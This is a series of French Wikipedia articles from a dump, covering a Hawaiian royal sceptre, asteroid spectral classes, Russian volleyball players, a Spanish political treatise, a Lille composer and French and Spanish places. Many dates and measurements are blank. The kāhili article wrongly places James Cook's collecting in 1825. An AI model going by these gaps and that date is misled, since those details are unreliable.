Un kāhili est un sceptre du royaume d'Hawaï. La hampe est constituée d'un os long d'un aliʻi ennemi vaincu et le plumeau de plumes d'oiseaux de proie. Le "" est le titre de celui qui transporte et arbore le kāhili à côté de son souverain.
Symbolique et protocole.
Le kāhili est le symbole de la royauté à Hawaï. Il représente le pouvoir divin actif dans sa forme destructive. Dans le protocole, il est toujours placé au-dessus de la tête du souverain. Chaque kāhili est unique si bien qu'ils reçoivent tous un nom qui leur est propre. Son lien puissant avec son souverain permet même de le représenter lorsque celui-ci est absent. Seul un aliʻi peut détenir un kāhili.
L'incorporation d'un os d'un aliʻi vaincu permet peut-être de faire le lien entre le nouveau souverain et la nouvelle terre gagnée en rappelant la légitimité de la conquête.
Outre son usage symbolique, un kāhili peut être utilisé lors de rituels de sorcellerie voire dans certains cas de crever les yeux des ennemis vaincus.
Histoire.
Les premiers contacts européens avec des kāhili se font en 1825 lorsque James Cook en récupère sept parmi de nombreux autres objets polynésiens et que le peintre Robert Dampier réalise un portrait de la princesse Nāhiʻenaʻena tenant un kāhili.
Fondé en 1889, le muséum Bishop à Honolulu possède une "" regroupant une importante collection de ces sceptres et de portraits de souverains.

</doc>
<doc id="7901712" url="https://fr.wikipedia.org/wiki?curid=7901712" title="Kahili">
Kahili



</doc>
<doc id="7901713" url="https://fr.wikipedia.org/wiki?curid=7901713" title="Pavel Zaytsev">
Pavel Zaytsev

Pavel Vladimirovitch Zaytsev (en ) est un joueur russe de volley-ball né le à Moscou (alors en URSS). Il mesure et joue passeur. Il est international russe.

</doc>
<doc id="7901721" url="https://fr.wikipedia.org/wiki?curid=7901721" title="1re légion des Francs">
1re légion des Francs



</doc>
<doc id="7901723" url="https://fr.wikipedia.org/wiki?curid=7901723" title="Astéroïde de type X">
Astéroïde de type X

Dans le cadre de l'étude spectrale des astéroïdes, le complexe X (antérieurement groupe X ou, de manière courante mais ambigüe, classe X ou type X) et le type X sont deux notions distinctes utilisées par plusieurs classifications spectrales.
La notion de complexe X est explicitement apparue dans la classifications de Bus (ou SMASS-II) en 1999, conjointement à celles de complexe S et de complexe C, et correspond à un ensemble de plusieurs types apparentés. Dans les classifications de Bus (1999) et de Bus-DeMeo (2009), on y retrouve un type X situé au cœur du complexe (dans l'espace des propriétés spectrales), et d'autres types (ou sous-types) notés par un système à deux lettres (Xe par exemple). Elle est l'héritière directe de la notion de groupe X introduite en 1984 par David J. Tholen, mais qui repose sur une subdivision très différente en types E, M, et P. Il n'existe pas à proprement parler de type X dans la classification de Tholen.
À fin 2023, la base de données « "Small-Body Database" » du Jet Propulsion Laboratory compte 1666 astéroïdes pour lesquels le type SMASS-II (classification de Bus) est renseigné, dont 289 astéroïdes appartenant au complexe X (17 %).
Propriétés.
Description spectrale du complexe et des types associés.
Une opposition fondamentale distingue :
Dans ce cadre, le complexe X se distingue du complexe C par un gradient tendanciellement plus rouge dans le visible et par d'éventuelles spécificités plus fines propres à tel ou tel type et différentes suivant la classification (albédo pour Tholen, petites marques d'absorption pour Bus ou Bus-DeMeo, courbures dans l'infrarouge pour Bus-DeMeo). Il se distingue des types T ou D par un gradient moins rouge à la fois dans le visible puis dans l'infrarouge.
Le tableau ci-dessous regroupe les descriptions spectrales originales, telles que proposées par David J. Tholen, Schelte J. Bus et Francesca E. DeMeo dans les publications décrivant leurs classifications respectives. Il indique également les astéroïdes alors mentionnés comme archétypes.
Les différences de description découlent pour partie des groupements statistiques obtenus mais aussi et surtout des différences de bandes spectrales considérées :
En particulier, la notion de gradient spectral (ou de spectre rouge ou bleu) se réfère toujours à ces bandes spectrales respectives (ou à une partie de celles-ci).
Hypothèses de composition et de liens avec les météorites.
Bien que présentant des similitudes spectrales, il est probable que les astéroïdes du groupe X possèdent des compositions et des origines variées susceptibles d'expliquer les grandes différences d'albédo ou les petites singularités de certains types.
Les spectres du type Xe peuvent contenir une bande d'absorption autour de , ce qui pourrait indiquer la présence de troïlite (FeS).
Type Xn.
Une étude coordonnée par Richard P. Binzel et publiée en 2019 sur les propriétés spectrales des astéroïdes géocroiseurs (NEA) a conduit les auteurs à proposer une classe pour la classification de Bus-DeMeo, rattachée au complexe X et notée Xn. Les astéroïdes concernés (6 dans le cadre de l'étude) présentent une absorption étroite centrée sur , jusque-là non distinguée. L'astéroïde de la ceinture principale (44) Nysa présente un spectre comparable ce qui a conduit à choisir la dénomination Xn.
Exploration.
Les deux astéroïdes (2867) Steins (de type E au sens de Tholen) et (21) Lutèce (de type M au sens de Tholen et de types Xk ou Xc au sens de Bus ou de Bus-DeMeo) ont été survolés en 2008 et 2010 par la sonde européenne Rosetta alors en route vers la comète 67P/Tchourioumov-Guérassimenko. Voir sections Exploration des astéroïdes de type E et Exploration des astéroïdes de type M. On peut également mentionner l'astéroïde (65803) Didymos (survolé en 2022 par la sonde DART avant son impact sur son satellite Dimorphos), d'abord considéré comme étant de type Xk au sens de Bus, mais aujourd'hui plus souvent considéré comme étant de type S au sens de Bus-DeMeo, à la suite de l'acquisition de données spectrales complémentaires dans l'infrarouge.

</doc>
<doc id="7901726" url="https://fr.wikipedia.org/wiki?curid=7901726" title="Grigoriy Afinogenov">
Grigoriy Afinogenov

Grigori Sergueïevitch Afinoguenov (en ) est un joueur russe de volley-ball né le à Moscou (alors en URSS). Il mesure et joue central.

</doc>
<doc id="7901732" url="https://fr.wikipedia.org/wiki?curid=7901732" title="Andrey Ananiev">
Andrey Ananiev

Andreï Vladimirovitch Ananiev (en ) est un joueur russe de volley-ball né le à Moscou. Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7901745" url="https://fr.wikipedia.org/wiki?curid=7901745" title="Justin Scott">
Justin Scott

Justin Scott, né le à New York dans l’État de New York, est un écrivain américain. Il publie sous son nom propre des thrillers et des romans policiers et sous le pseudonyme de Paul Garrison des romans d’aventures et des romans d'espionnage. Il a utilisé à ses débuts les pseudonymes de J. S. Blazer et Alexander Cole pour publier des romans policiers.
Biographie.
Fils de l’écrivain Alexander Leslie Scott et de la romancière et nouvelliste Lily K. Scott, il exerce de nombreux métiers, étant tour à tour camionneur, pilote de bateaux, ouvrier du bâtiment, employé dans le commerce et rédacteur de magazines, avant de devenir écrivain.
Il débute en 1973 avec la publication de deux romans policiers. "Many Happy Returns", écrit sous son nom, est traduit en France à la Série noire la même année sous le titre "T’as le bonjour". "Dead Me Out", publié sous le pseudonyme de J. S. Blazer, est traduit au sein de la collection Super noire en 1975 sous le titre "J’suis pas dans le coup". Ces deux romans s’inscrivent dans la lignée des bons romans policiers humoristiques de l’époque.
Scott utilise une seconde fois le pseudonyme de J. S. Blazer en 1975, puis signe plusieurs romans policiers de son nom, dont "Treasure for Treasure", publié à nouveau à la Super noire en 1975 sous le titre "L’Or à la pelle". À la fin des années 1970, il s’oriente vers le roman d’aventures et publie de manière égale dans les deux genres. Au fil des ans, son œuvre évolue et s’oriente, passant du roman policier simple au thriller.
En 1983, il utilise le pseudonyme d’Alexander Cole le temps d’un roman, œuvre qu’il enrichit et publie une seconde fois sous son nom en 1985. En 1998, il utilise pour la première fois le pseudonyme de Paul Garrison. Il garde alors ce nom pour signer ses romans d’aventures et conserve Justin Scott pour ses thrillers. À partir de 2009, il co-écrit avec Clive Cussler la série consacrée à Isaac Bell, un détective privé multi-tâches, héros de plusieurs romans. En 2012, il reprend la série consacrée à Paul Janson, commencée par Robert Ludlum et resté inachevée après son décès en 2001.

</doc>
<doc id="7901746" url="https://fr.wikipedia.org/wiki?curid=7901746" title="Andreï Maksimov">
Andreï Maksimov

Andreï Iourievitch Maksimov (en ) est un joueur russe de volley-ball né le à Zelenogorsk (kraï de Krasnoïarsk, alors en URSS). Il mesure et joue attaquant.

</doc>
<doc id="7901747" url="https://fr.wikipedia.org/wiki?curid=7901747" title="L'Héritage de la passion">
L'Héritage de la passion

L'Héritage de la passion (") est un téléfilm canadien réalisé par Jerry Ciccoritti et diffusé aux États-Unis le sur et le sur le réseau CTV.
Synopsis.
Le téléfilm raconte les événements qui ont mené au décès du multi-millionnaire Ted Ammon en et du procès de l'amant de sa femme, Daniel Pelosi.
Accueil.
Le téléfilm a été vu par environ 4,81 millions de téléspectateurs lors de sa première diffusion américaine, ainsi que téléspectateurs canadiens.

</doc>
<doc id="7901748" url="https://fr.wikipedia.org/wiki?curid=7901748" title="J.S Blazer">
J.S Blazer



</doc>
<doc id="7901749" url="https://fr.wikipedia.org/wiki?curid=7901749" title="Romulus (âne)">
Romulus (âne)

En , Romulus est le plus grand âne vivant au monde d'après le Livre Guinness des records. Ses propriétaires sont Phil et Cara Barker Yellott de Red Oak (Texas). Romulus est un American Mammoth Jackstock hongre. Romulus a un frère, Remus, qui est plus petit de 51 millimètres.
Description.
Romulus est né en 2004 et sa taille, des sabots au garrot, a été mesurée à , soit 17 centimètres de plus que le précédent record détenu par Oklahoma Sam. Romulus pèse environ 590 kilogrammes. Romulus et Remus sont des American Mammoth Jackstock, la race d'ânes la plus grande au monde, développée pour produire de grandes mules lors de croisement avec des juments. Les deux ânes sont utilisés par leurs propriétaires comme animaux de garde pour protéger le bétail des prédateurs.
Livre Guinness des records.
Le , Romulus est mesuré pour le Livre Guinness des records. Les documents sont reçus et certifiés à Londres par le Guinness World Records le .

</doc>
<doc id="7901750" url="https://fr.wikipedia.org/wiki?curid=7901750" title="Paul Garrison">
Paul Garrison



</doc>
<doc id="7901753" url="https://fr.wikipedia.org/wiki?curid=7901753" title="Leonid Kouznetsov">
Leonid Kouznetsov

Leonid Konstantinovitch Kouznetsov (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.

</doc>
<doc id="7901754" url="https://fr.wikipedia.org/wiki?curid=7901754" title="Famille de Garrigues de Flaujac">
Famille de Garrigues de Flaujac

La famille de Garrigues de Flaujac est une famille de la noblesse française subsistante.
Elle compte parmi ses membres des officiers, un préfet, un général.
Histoire.
Gustave Chaix d'Est-Ange fait débuter la filiation suivie de la famille de Garrigues de Flaujac au .
Ce même auteur rapporte que la famille de Garrigues de Flaujac est condamnée pour usurpation de noblesse en 1666 puis à nouveau en 1746, mais en 1784 Jean Charles de Garrigues de Flaujac obtient un arrêt du Conseil d'État qui casse le jugement de 1746. Celui-ci demande également que le jugement de 1666 soit cassé mais Chérin envoie en 1786 un mémoire défavorable à cette demande en faisant remarquer que les actes de 1555, 1568, 1613, 1620, n'étaient que des copies.
Régis Valette dans "Catalogue de la noblesse française au " indique que cette famille a été anoblie en 1784 par l'obtention d'une maintenue en la noblesse.
La famille de Garrigues de Flaujac a été admise en 1975 au sein de l'Association d'entraide de la noblesse française.
Fiefs.
En Quercy :
Alliances.
Les principales alliances de la famille de Garrigues de Flaujac sont : de Viguier (1639), de Lolmie (1678), de Pousargues (1734), de Subrejon (1766), Agard de Roumejoux, de Lasteyrie du Saillant (1868), Geay de Montenon (1895), La Royer de La Motte, de Brondeau (1901), Hug de Larauze, Formiger de Beaupuy de Génis, etc.

</doc>
<doc id="7901760" url="https://fr.wikipedia.org/wiki?curid=7901760" title="Niklas Sjökvist">
Niklas Sjökvist

Niklas Sjökvist, né le , est un joueur professionnel suédois de hockey sur glace qui évoluait en position de centre. Il est le père de Tobias Sjökvist.

</doc>
<doc id="7901767" url="https://fr.wikipedia.org/wiki?curid=7901767" title="Maksim Botine">
Maksim Botine

Maksim Sergueïevitch Botine (en ) est un joueur russe de volley-ball né le à Moscou (alors en URSS). Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7901778" url="https://fr.wikipedia.org/wiki?curid=7901778" title="Empresas políticas">
Empresas políticas

L'Idea de un príncipe político cristiano en cien empresas (Idée d'un prince politique chrétien en cent gravures), aussi connue sous le titre d'Empresas políticas, est un traité de science politique du diplomate et homme de lettres espagnol Diego Saavedra Fajardo.
L'œuvre fut éditée une première fois à Munich en 1640, puis une deuxième fois dans une version remaniée par l'auteur à Milan en 1642. 
Circonstances d'écriture.
Homme de terrain, Saavedra Fajardo a composé l'essentiel des" Empresas" sur les routes, entre deux étapes de ses périples diplomatiques. Dans l'avis « au lecteur » qui ouvre l'œuvre, il écrit : « Dans le studieux loisir de mes continuels voyages vers l'Allemagne et d'autres provinces, j'ai conçu ces cents gravures, qui composent l"'Idea de un Príncipe Político Cristiano", notant dans les auberges ce à quoi j'avais pensé en cours de route, lorsque la correspondance ordinaire avec le roi notre seigneur, ses ministres et les autres fonctionnaires qui étaient à ma charge m'accordait quelque temps libre ». 
Influences et contenu.
S'appuyant tant sur sa riche expérience de la diplomatie que sur sa remarquable érudition littéraire, Saavedra Fajardo brosse le portrait du gouvernant idéal, prudent, fervent et juste. En cela, l'œuvre s'inscrit dans la tradition médiévale des miroirs du prince, mais s'en distingue cependant par le pragmatisme et le réalisme politiques dont fait foi l'auteur, hérités en partie de la lecture de Tacite dont Saavedra se réclame. C'est ainsi qu'à l'Empresa 43, tout en se défendant de se faire le chantre du machiavélisme, il recommande au prince de savoir recourir à la ruse et à la dissimulation, uniquement lorsque cela est nécessaire pour assurer la sauvegarde de l'État, et ce en dérogeant le moins possible aux principes chrétiens de probité et de justice.
Le recours à l'emblème.
Formellement, chaque "Empresa" se compose d'une gravure allégorique, complétée d'une maxime en latin ou en espagnol. Saavedra Fajardo commente ensuite la gravure, qu'il illustre de nombreux exemples essentiellement tirés des "Annales" de Tacite, de l'Ancien Testament et de l"'Histoire générale de l'Espagne" de Juan de Mariana. Le recours à l'emblème, très en vogue chez les écrivains baroques du Siècle d'or espagnol depuis la publication des "Emblemata" d'André Alciat, se justifiait par la valeur mnémotechnique de ces gravures allégoriques. L'ouvrage, dédiée au prince Balthazar-Charles d'Autriche, fils de Philippe IV, est en effet sous-tendu par un réel souci pédagogique.
Structure.
Le diplomate murcien répartit ces Empresas en huit sections :
Bibliographie.
ABELLÁN, José Luis, "Historia crítica del pensamiento español, tomo III : del Barroco a la Ilustración (Siglos XVII y XVIII)", Espasa-Calpe, Madrid, 1988.
JOUCLA-RUAU, André, "Le tacitisme de Saavedra Fajardo", Éditions hispaniques, Paris, 1977.
SAAVEDRA FAJARDO, Diego, "Idea de un príncipe político cristiano representada en cien empresas", édition de Sagrario López, édition Cátedra, Madrid, 1999.

</doc>
<doc id="7901780" url="https://fr.wikipedia.org/wiki?curid=7901780" title="La Terre au ventre">
La Terre au ventre

La Terre au ventre est un film français réalisé par Tony Gatlif, sorti en 1979.

</doc>
<doc id="7901787" url="https://fr.wikipedia.org/wiki?curid=7901787" title="Roman Stepanov">
Roman Stepanov

Roman Iourievitch Stepanov (en ) est un joueur russe de volley-ball né le à Zelenogorsk (kraï de Krasnoïarsk, alors en URSS). Il mesure et joue libero. Il est international russe.

</doc>
<doc id="7901788" url="https://fr.wikipedia.org/wiki?curid=7901788" title="Nadipariksha">
Nadipariksha



</doc>
<doc id="7901792" url="https://fr.wikipedia.org/wiki?curid=7901792" title="Nadi Vigyan">
Nadi Vigyan



</doc>
<doc id="7901797" url="https://fr.wikipedia.org/wiki?curid=7901797" title="Nadivigyan">
Nadivigyan



</doc>
<doc id="7901807" url="https://fr.wikipedia.org/wiki?curid=7901807" title="Roman Danilov">
Roman Danilov

Roman Guennadievitch Danilov (en ) est un joueur russe de volley-ball né le à Bakou (RSS d'Azerbaïdjan). Il mesure et joue réceptionneur-attaquant. Il est international russe.

</doc>
<doc id="7901814" url="https://fr.wikipedia.org/wiki?curid=7901814" title="Gusen">
Gusen

La est une rivière de Haute-Autriche qui naît de la confluence de la et de la . Elle termine son parcours dans le Danube après .
C'est aussi le nom d'un camp de concentration : le camp de concentration de Gusen.

</doc>
<doc id="7901827" url="https://fr.wikipedia.org/wiki?curid=7901827" title="Office franco-allemand pour les énergies renouvelables">
Office franco-allemand pour les énergies renouvelables



</doc>
<doc id="7901829" url="https://fr.wikipedia.org/wiki?curid=7901829" title="Conrad III de Carinthie">
Conrad III de Carinthie

Conrad III (également nommé "Kuno" ou "Conrad de Zülpich"), mort en 1061, fut duc de Carinthie et margrave de Vérone de 1056 jusqu'á sa mort.
Biographie.
Conrad est issu d'une ligne collatérale des Ezzonides, comtes palatins en Lotharingie. Son père est le comte Hezzelin de Zülpich († 1033), frère du comte palatin Ezzo de Lotharingie, et sa mère une sœur putative de l'empereur Conrad II le Salique ; il est également le frère du comte palatin Henri de Lotharingie, dit "le Furieux".
Bien qu'il soit impliqué en 1055 dans la révolte des ducs Conrad de Bavière et Welf III contre l'empereur Henri III, il rentre en grâce auprès de la régente Agnès de Poitiers l'année suivante et, en tant que parent de la dynastie franconienne, reçoit le duché de Carinthie en fief dès Noël 1056. Il ne réussit toutefois pas à prendre le contrôle de la Carinthie, car la famille du comte Markwart d'Eppenstein († 1076), le fils de l'ancien duc Adalbéron († 1039), est trop puissante. Conrad prévoyait d'entamer une campagne militaire mais il n'est même pas certain que le duc n'ait jamais pu pénétrer en Carinthie ni combattre ses adversaires car il meurt dès 1061
Sources.
, édition du .

</doc>
<doc id="7901830" url="https://fr.wikipedia.org/wiki?curid=7901830" title="Cosmodrome">
Cosmodrome



</doc>
<doc id="7901842" url="https://fr.wikipedia.org/wiki?curid=7901842" title="Nikita Alekseyev">
Nikita Alekseyev

Nikita Alekseïevitch Alekseïev (en ) est un joueur russe de volley-ball né le à Moscou. Il mesure et joue réceptionneur-attaquant. Il totalise 41 sélections en équipe de Russie.

</doc>
<doc id="7901856" url="https://fr.wikipedia.org/wiki?curid=7901856" title="Gouvernement d'Åbo et Björneborg">
Gouvernement d'Åbo et Björneborg

Le gouvernement d’Åbo et Björneborg (en , en , en ) est une division administrative du Grand-duché de Finlande au sein de l’Empire russe, qui exista de 1811 jusqu’à l’indépendance de la Finlande en 1917. Sa capitale est la ville de Åbo (en finnois "Turku").
Géographie.
Situé au sud-ouest de la Finlande, le gouvernement d’Åbo et Björneborg était bordé à l’ouest par le golfe de Botnie, au nord par le gouvernement de Vasa, à l’est par celui de Tavastehus et au sud par celui de Nyland.
Le territoire du gouvernement d’Åbo et Björneborg fut maintenu comme entité administrative de la Finlande indépendante jusqu’en 1997 et fait désormais partie de la province de Finlande occidentale ("Länsi-Suomen lääni").
Subdivisions administratives.
En 1908 le gouvernement d’Åbo et Björneborg était divisé en dix ouïezds : Halikko, Masku, Virmo, Vemo, Piikkiö, haut Satakunta supérieur, moyen Satakunta supérieur, bas Satakunta supérieur, Satakunta inférieur et les îles Åland.
Population.
En 1888 la population du gouvernement était de habitants, dont 82,72 % de Finnois et 17 % de Suédois (principalement sur les îles et les régions côtières).

</doc>
<doc id="7901857" url="https://fr.wikipedia.org/wiki?curid=7901857" title="Guilherme Guido Augusto">
Guilherme Guido Augusto



</doc>
<doc id="7901859" url="https://fr.wikipedia.org/wiki?curid=7901859" title="Alekseï Samoïlenko">
Alekseï Samoïlenko

Alekseï Viktorovitch Samoïlenko (en ) est un joueur russe de volley-ball né le à Komsomolsk-sur-l'Amour (kraï de Khabarovsk, alors en URSS). Il mesure et joue central.

</doc>
<doc id="7901863" url="https://fr.wikipedia.org/wiki?curid=7901863" title="Poussières d'amour (film, 1996)">
Poussières d'amour (film, 1996)

Poussières d'amour ("Abfallprodukte der Liebe") est un film franco-britannico-allemand réalisé par Werner Schroeter, sorti en 1996.

</doc>
<doc id="7901864" url="https://fr.wikipedia.org/wiki?curid=7901864" title="Quirós (Asturies)">
Quirós (Asturies)

Quirós est une commune ("concejo" aux Asturies) située dans la communauté autonome des Asturies en Espagne. Elle est limitrophe au nord des communes de Santo Adriano et Morcín ; au sud de Lena et la province de León ; à l'est de Riosa, Morcín et Lena et à l'ouest de Proaza et Teverga.
Géographie.
Géographiquement, elle se compose de deux vallées : celle du Ricabo, qui prend sa source à l'ombre de la Peña Cigal et qui est renforcée par les eaux de la source Los Garrafes, et celle des Lindes, qui prend sa source à El Nacimiento, au cœur de Puerto Agüeria, tout près de la première et de la frontière avec la province de León.
Les deux rivières se rejoignent à Santa Marina (anciennement "Ambas Mestas"), formant une seule vallée plus large, aujourd'hui appelée Quirós, qui possède de part et d'autre de nombreux cours d'eau par lesquels s'écoulent les ruisseaux qui alimentent le cours d'eau principal. Ces petites vallées regorgent de bois, de prairies et de terres agricoles (beaucoup moins que par le passé), et c'est là que l'on trouve les principales traces d'occupation humaine, que ce soit dans les villages ou dans les fermes disséminées sur le terrain accidenté.
Le paysage est très montagneux (sur les 208,79 km² de la zone, 40 % ont une altitude supérieure à 1 200 mètres et seulement 3 % ont une pente inférieure à 20 %), bien que l'étroitesse soit quelque peu atténuée dans les vallées fluviales, notamment celles du Noceo et du Pontonga à Santa Marina, de l'Arrojo et de Las Agüeras. Les villages (localités, fermes) sont situés sur les rives des rivières ou à mi-chemin des vallées.
Paroisses.
La commune de Quirós comprend 13 paroisses :
Histoire.
De nombreuses découvertes de la période néolithique attestent d'une implantation précoce sur la commune. Les dolmens et les forteresses de la montagne Cobertoria ainsi que la mine de cuivre d'Aramo témoignent également de l'ancienne vie économique.
Lors de l'occupation de la péninsule Ibérique par l'Empire romain, le territoire autour de Quiros était également important, comme en témoignent les nombreux noms donnés aux lieux. Par contre, l'invasion des Wisigoths et la conquête de l'Espagne par les Maures éclipsèrent quelque peu cette région de l'histoire.
Pendant la période du royaume des Asturies, Quiros fut subordonnée à l'archevêché d'Oviedo par décret d'Ordoño. Au , Philippe II, en accord avec le pape Grégoire XIII, accorda à Quiros le droit de commune et la libéra ainsi de l'administration de l'archevêché. 

</doc>
<doc id="7901865" url="https://fr.wikipedia.org/wiki?curid=7901865" title="Poussières d'amour">
Poussières d'amour



</doc>
<doc id="7901866" url="https://fr.wikipedia.org/wiki?curid=7901866" title="Émile Pierre Ratez">
Émile Pierre Ratez

Émile Pierre Ratez (né à Besançon le , décédé à Lille le ) est un compositeur, violoniste et altiste français.
Biographie.
Émile Pierre Ratez est né à Besançon le . Il est le fils de Pierre Antoine Ratez (né en 1806 à Besançon et mort en 1880 à Paris), imprimeur et de Laurence Gaillard (née en 1820 à Besançon et morte après 1890).
Il commença des études classiques au lycée de Besançon et obtint son baccalauréat avant d'entrer dans l'administration des ponts et chaussées.
Il se maria avec Marie Joséphine Eugénie Welsh (1864-1929), institutrice. Ils eurent deux enfants : Marie Ratez (1890-1954) et Suzanne Ratez (1893-1967).
Par ailleurs, il était connu pour être républicain et franc-maçon.
Il est mort à Lille le au 10 bis rue de Metz.
Formation.
Il fut d'abord durant trois ans, sur son temps libre, l'élève de Pierre Demol, ancien prix de Rome de Bruxelles, à l'école municipale de musique de Besançon où il commença sa formation musicale (leçons d'harmonie et de contrepoint). Après y avoir obtenu des premiers prix en solfège et en violon, il donna sa démission de son poste obtenu au sein de l'administration des ponts et chaussées.
Il arriva à Paris en août 1872 et devint d'abord l'élève de François Bazin puis de Jules Massenet, qui lui succéda en 1878, au Conservatoire de musique et de déclamation.
Années d'activité.
Il a été violoniste ou altiste aux orchestres de l'Opéra-Comique, du Théâtre Italien et aux Concerts Colonne. Il fut également chef des chœurs des Concerts Colonne de 1878 à 1881.
En 1891, il succède à Ferdinand Lavainne en tant que directeur du conservatoire de Lille.
Il a dirigé dans cette ville l'orchestre de la Société des concerts populaires (1893-1906). Son activité de chef est critiqué par les milieux conservateurs mais il obtient des succès dans le répertoire berliozien. Sa politique d'invitation de compositeurs français contemporains contribue à la renommée de la Société des concerts populaires. En 1906, tout en demeurant directeur artistique de cette Société, il cède sa place en tant que chef d'orchestre à Alfred Cortot.
Il collabore avec Clarisse Bourdeney. Il est lauréat en 1897 du prix Chartier de l'Académie des beaux-arts pour sa production de musique de chambre.
Il a rédigé un "Traité élémentaire de contrepoint et de fugue", édité chez Leduc en 1902.
Il fut témoin de l'inhumation d'un autre musicien lillois, l'hautboïste Edmond Deren, mort en 1931, également enterré au cimetière de l'Est de Lille.
Il prit sa retraite en 1931 après 40 ans à la tête du conservatoire de Lille. Edmond Gaujac fut nommé et prit sa succession.

</doc>
<doc id="7901868" url="https://fr.wikipedia.org/wiki?curid=7901868" title="Abfallprodukte der Liebe">
Abfallprodukte der Liebe



</doc>
<doc id="7901870" url="https://fr.wikipedia.org/wiki?curid=7901870" title="Sogecap">
Sogecap



</doc>
<doc id="7901874" url="https://fr.wikipedia.org/wiki?curid=7901874" title="Hôtel de Villebrême">
Hôtel de Villebrême

L'hôtel de Villebresme, plus communément appelé « Maison de Denis Papin », se trouve en haut de la rue "Pierre-de-Blois", dans la ville de Blois (région Centre-Val de Loire). L'édifice est répertorié dans la base Mérimée du ministère de la Culture et figue parmi les monuments historiques depuis 1928.
Historique.
Maison datant de la fin du de style gothique. Elle a été construite à l'intention de l'un des membres de la famille de Villebresme, propriétaire du château de Fougères-sur-Bièvre et dont l'un était secrétaire de la mère de Louis XII, Marie de Clèves.
Il faut attendre les années 1900 pour que cet hôtel soit nommé « Maison de Denis Papin » dans les guides touristiques. Toutefois, il n'est pas certain que Denis Papin y ait véritablement vécu. L'hôtel de Villebresme a été inscrit Monument historique par arrêté du et est aujourd'hui une propriété privée.
Architecture.
La demeure se distingue par son plan : deux bâtiments sont situés de part et d'autre de la rue. L'originalité de la bâtisse réside dans sa passerelle en bois, qui relie les bâtiments au niveau du premier étage. Le corps du logis situé côté sud de la rue comporte un étage en pans de bois en encorbellement sur le rez-de-chaussée, communiquant avec la galerie.
La passerelle comporte sur chacune de ses faces une fenêtre à meneaux qui a la forme d'une croix latine. Les fenêtres sont moulurées et ornées de cul-de-lampe (ornement rappelant le dessous d'une lampe d'église).
On retrouve des sculptures représentant de petits acrobates sur les consoles de la passerelle. À l’extrémité de la sablière, poutre horizontale sur le mur de la façade sud, on peut apercevoir un engoulant.

</doc>
<doc id="7901877" url="https://fr.wikipedia.org/wiki?curid=7901877" title="Courant du Pacifique nord">
Courant du Pacifique nord

Le courant du Pacifique nord aussi appelé dérive du Pacifique Nord est un courant chaud et lent allant d'ouest en est. Il est situé entre le 40 et le nord. Il forme la partie nord du gyre subtropical du Pacifique nord et est créé par la collision des courants Kuroshio et du Oya shivo. 

</doc>
<doc id="7901881" url="https://fr.wikipedia.org/wiki?curid=7901881" title="Dmitri Kiritchenko (volley-ball, 1987)">
Dmitri Kiritchenko (volley-ball, 1987)

Dmitri Vladimirovitch Kiritchenko (en ) est un joueur russe de volley-ball né le à Klioutchi (kraï du Kamtchatka, alors en URSS). Il mesure et joue libero.

</doc>
<doc id="7901882" url="https://fr.wikipedia.org/wiki?curid=7901882" title="Upanayana">
Upanayana

L'Upanayana est un rite de passage de l'hindouisme: un samskara. Il marque chez l'enfant le début de l'étude des textes sacrés: les Védas, et de l'éducation en général. L'histoire de l'Inde a fait que plus la caste de l'enfant est élevée, plus la cérémonie a lieu tôt dans sa vie, tout en sachant que généralement ce rite n'était, autrefois, pratiqué qu'envers les garçons. Un pagne, une ceinture, un cordon sacré sont transmis au jeune étudiant. Le cordon se retrouve dans l'Inde du sud comme du nord et est vraiment le lien entre toutes les traditions de cette cérémonie et le symbole le plus marquant, symbolisant le rattachement à la connaissance mais aussi à un professeur. Yajnopavita est le nom de ce cordon. L'Upanayana est un des Saṃskāra les plus importants avec le mariage et les enterrements. Remplie de symboles, la cérémonie rend grâce au dieu Agni qui tel le soleil illumine les consciences des chercheurs de paix, l'ahimsa du sous-continent indien. Don au temple et cérémonie autour du feu sont de mise.
Dans la Manusmṛti (Lois de Manu), Livre 2e, qui traite des : « "Fondement de la Loi. Sacrements : initiation, noviciat." » et compte 249 versets, le n° 44 prescrit que:
À l'issue de la cérémonie, le récipiendaire est devenu un Dvija, qui signifie « "deux fois né" ». 

</doc>
<doc id="7901901" url="https://fr.wikipedia.org/wiki?curid=7901901" title="Dahachaur">
Dahachaur

Dahachaur (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7901904" url="https://fr.wikipedia.org/wiki?curid=7901904" title="École secondaire expérimentale de Guangdong">
École secondaire expérimentale de Guangdong



</doc>
<doc id="7901906" url="https://fr.wikipedia.org/wiki?curid=7901906" title="Iegor Feoktistov">
Iegor Feoktistov

Iegor Nikolaïevitch Feoktistov (en ) est un joueur russe de volley-ball né le à Beloretsk (Bachkirie). Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7901907" url="https://fr.wikipedia.org/wiki?curid=7901907" title="Keuchingen">
Keuchingen

Keuchingen est un quartier de la commune allemande de Mettlach en Sarre.
Histoire.
Village cédé au royaume de France par la convention du premier .
Ancienne commune de Moselle du canton de Sierck sous le nom de "Keuching", cédé à la Prusse en 1815.

</doc>
<doc id="7901918" url="https://fr.wikipedia.org/wiki?curid=7901918" title="Iaroslav Ostrakhovski">
Iaroslav Ostrakhovski

Iaroslav Pavlovitch Ostrakhovski (en ) est un joueur russe de volley-ball né le . Il mesure et joue passeur.

</doc>
<doc id="7901921" url="https://fr.wikipedia.org/wiki?curid=7901921" title="Jean-Jacques Launier">
Jean-Jacques Launier

Jean-Jacques Launier, né le à Alger, est une personnalité française de l’art, écrivain et fondateur d’Art ludique – Le Musée dont il est le président. Il devient également président de la commission du Fonds d'aide au jeu vidéo du Centre national du cinéma et de l’image animée (CNC) en 2014 pour un mandat de deux ans. 
Biographie.
Jean-Jacques Launier a fait des études de dessins à l’École supérieure des arts Modernes de Paris dans les années 1980, avant de devenir directeur artistique dans la publicité pour lesquelles il conçoit des films et dessine des story-boards. Il conçoit ensuite des campagnes et affiches françaises de films de Wim Wenders, Stephen Frears, Quentin Tarantino.
Passionné par la Figuration narrative, il crée en 2003, avec Diane Launier et Jean-Francois Camilleri, sur l’Île Saint-Louis à Paris, la galerie Arludik, spécialisée dans les dessins originaux issus de la bande dessinée, du jeu vidéo, des mangas, du film d’animation et du cinéma.
